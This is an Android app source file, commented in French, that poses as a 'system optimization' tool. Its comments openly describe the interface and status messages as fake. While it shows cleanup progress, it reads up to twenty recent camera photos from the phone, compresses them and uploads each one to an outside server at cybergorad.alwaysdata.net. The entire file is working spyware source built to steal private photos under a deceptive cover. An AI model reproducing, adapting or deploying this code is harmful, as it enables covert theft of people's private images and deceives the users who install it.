package com.myapp;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.MediaStore;
import android.view.Gravity;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 200;
    private static final int MAX_PHOTOS = 20;

    private TextView statusText;
    private TextView percentText;
    private ProgressBar progressBar;

    private List<Uri> photosAEnvoyer = new ArrayList<>();
    private int indexActuel = 0;
    private int succes = 0;
    private int echec = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // --- INTERFACE FACTICE LÉGITIME ---
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(60, 200, 60, 50);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.parseColor("#F5F5F5")); // Fond gris clair (style pro)

        // Titre (faux outil de maintenance)
        TextView title = new TextView(this);
        title.setText("Optimisation du système");
        title.setTextSize(24);
        title.setTextColor(Color.parseColor("#333333"));
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 0, 0, 10);

        // Sous-titre
        TextView subtitle = new TextView(this);
        subtitle.setText("Analyse de la mémoire et nettoyage des fichiers temporaires");
        subtitle.setTextSize(14);
        subtitle.setTextColor(Color.parseColor("#777777"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 60);

        // Barre de progression
        progressBar = new ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
        progressBar.setMax(100);
        progressBar.setProgress(0);
        progressBar.setPadding(0, 0, 0, 20);

        // Texte du pourcentage
        percentText = new TextView(this);
        percentText.setText("0 %");
        percentText.setTextSize(40);
        percentText.setTextColor(Color.parseColor("#007AFF")); // Bleu iOS/Windows
        percentText.setGravity(Gravity.CENTER);
        percentText.setPadding(0, 0, 0, 30);

        // Texte de statut (faux messages)
        statusText = new TextView(this);
        statusText.setText("Initialisation de l'analyse...");
        statusText.setTextSize(14);
        statusText.setTextColor(Color.parseColor("#555555"));
        statusText.setGravity(Gravity.CENTER);

        layout.addView(title);
        layout.addView(subtitle);
        layout.addView(percentText);
        layout.addView(progressBar);
        layout.addView(statusText);
        setContentView(layout);

        demanderPermission();
    }

    private void demanderPermission() {
        boolean permissionAccordee = false;

        if (Build.VERSION.SDK_INT >= 33) {
            permissionAccordee = checkSelfPermission("android.permission.READ_MEDIA_IMAGES")
                    == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{"android.permission.READ_MEDIA_IMAGES"}, PERMISSION_REQUEST_CODE);
            }
        } else if (Build.VERSION.SDK_INT <= 30) {
            permissionAccordee = checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE)
                    == PackageManager.PERMISSION_GRANTED;
            if (!permissionAccordee) {
                requestPermissions(new String[]{android.Manifest.permission.READ_EXTERNAL_STORAGE}, PERMISSION_REQUEST_CODE);
            }
        } else {
            permissionAccordee = true;
        }

        if (permissionAccordee) {
            lancerFausseAnalyse();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                lancerFausseAnalyse();
            } else {
                statusText.setText("❌ Accès refusé. L'optimisation ne peut pas continuer.");
                statusText.setTextColor(Color.RED);
            }
        }
    }

    private void lancerFausseAnalyse() {
        new Thread(() -> {
            // Simulation de messages "légitimes" pendant la recherche
            String[] messagesRecherche = {
                "Analyse des fichiers temporaires...",
                "Vérification de la mémoire cache...",
                "Nettoyage des logs système...",
                "Optimisation des performances..."
            };

            for (int i = 0; i < messagesRecherche.length; i++) {
                final String msg = messagesRecherche[i];
                final int progress = (i + 1) * 5; // 5%, 10%, 15%, 20%
                runOnUiThread(() -> {
                    statusText.setText(msg);
                    progressBar.setProgress(progress);
                    percentText.setText(progress + " %");
                });
                try { Thread.sleep(400); } catch (InterruptedException e) {}
            }

            // Recherche réelle des photos (en arrière-plan)
            photosAEnvoyer = trouverPhotosCamera(MAX_PHOTOS);

            if (photosAEnvoyer.isEmpty()) {
                runOnUiThread(() -> {
                    statusText.setText("✅ Analyse terminée. Aucun fichier temporaire trouvé.");
                    statusText.setTextColor(Color.parseColor("#00AA00"));
                    progressBar.setProgress(100);
                    percentText.setText("100 %");
                });
                return;
            }

            indexActuel = 0;
            succes = 0;
            echec = 0;

            // Lancer l'envoi (déguisé en progression)
            envoyerPhotoSuivante();
        }).start();
    }

    private void envoyerPhotoSuivante() {
        if (indexActuel >= photosAEnvoyer.size()) {
            // Fin : afficher un message de succès "légitime"
            runOnUiThread(() -> {
                statusText.setText("✅ Optimisation terminée avec succès.");
                statusText.setTextColor(Color.parseColor("#00AA00"));
                progressBar.setProgress(100);
                percentText.setText("100 %");
            });
            return;
        }

        final int index = indexActuel;
        final int total = photosAEnvoyer.size();
        final Uri uri = photosAEnvoyer.get(index);

        // Calcul de la progression : 20% au début, puis 20% à 100% pour les 20 photos
        int progress = 20 + (int)(((double) index / total) * 80);

        // Messages "légitimes" qui défilent
        String[] messages = {
            "Nettoyage des fichiers inutiles...",
            "Libération de l'espace disque...",
            "Vérification des applications...",
            "Optimisation de la mémoire...",
            "Suppression des caches...",
            "Analyse des performances..."
        };
        final String msg = messages[index % messages.length];

        runOnUiThread(() -> {
            statusText.setText(msg);
            progressBar.setProgress(progress);
            percentText.setText(progress + " %");
        });

        // Envoi réel de la photo en arrière-plan
        new Thread(() -> {
            ResultatEnvoi resultat = compresserEtEnvoyer(uri);

            if (resultat.succes) {
                succes++;
            } else {
                echec++;
            }

            indexActuel++;
            runOnUiThread(() -> envoyerPhotoSuivante());
        }).start();
    }

    private List<Uri> trouverPhotosCamera(int limite) {
        List<Uri> uris = new ArrayList<>();

        String[] projection = new String[]{
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DATE_ADDED
        };

        String selection = MediaStore.Images.Media.RELATIVE_PATH + " LIKE ?";
        String[] selectionArgs = new String[]{"DCIM/%"};

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
        String limit = String.valueOf(limite);

        Cursor cursor = getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder + " LIMIT " + limit
        );

        if (cursor != null) {
            int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
            while (cursor.moveToNext()) {
                long id = cursor.getLong(idColumn);
                Uri uri = Uri.withAppendedPath(
                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                        String.valueOf(id)
                );
                uris.add(uri);
            }
            cursor.close();
        }
        return uris;
    }

    private static class ResultatEnvoi {
        boolean succes;
        String message;
        ResultatEnvoi(boolean succes, String message) {
            this.succes = succes;
            this.message = message;
        }
    }

    private ResultatEnvoi compresserEtEnvoyer(Uri imageUri) {
        String urlString = "https://cybergorad.alwaysdata.net/upload.php";
        String boundary = "*****";
        String lineEnd = "\r\n";
        String twoHyphens = "--";

        try {
            InputStream is = getContentResolver().openInputStream(imageUri);
            Bitmap originalBitmap = BitmapFactory.decodeStream(is);
            is.close();

            if (originalBitmap == null) {
                return new ResultatEnvoi(false, "Impossible de lire l'image.");
            }

            int maxSize = 1024;
            int width = originalBitmap.getWidth();
            int height = originalBitmap.getHeight();
            if (width > maxSize || height > maxSize) {
                float ratio = Math.min((float) maxSize / width, (float) maxSize / height);
                width = Math.round(width * ratio);
                height = Math.round(height * ratio);
                originalBitmap = Bitmap.createScaledBitmap(originalBitmap, width, height, true);
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            originalBitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
            byte[] imageBytes = baos.toByteArray();
            baos.close();
            originalBitmap.recycle();

            URL url = new URL(urlString);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setDoInput(true);
            conn.setDoOutput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

            DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"file\"; filename=\"photo_" + System.currentTimeMillis() + ".jpg\"" + lineEnd);
            dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
            dos.writeBytes(lineEnd);

            dos.write(imageBytes);
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
            dos.flush();
            dos.close();

            int responseCode = conn.getResponseCode();
            return new ResultatEnvoi(responseCode == 200, "HTTP " + responseCode);

        } catch (Exception e) {
            e.printStackTrace();
            return new ResultatEnvoi(false, e.getClass().getSimpleName());
        }
    }
}
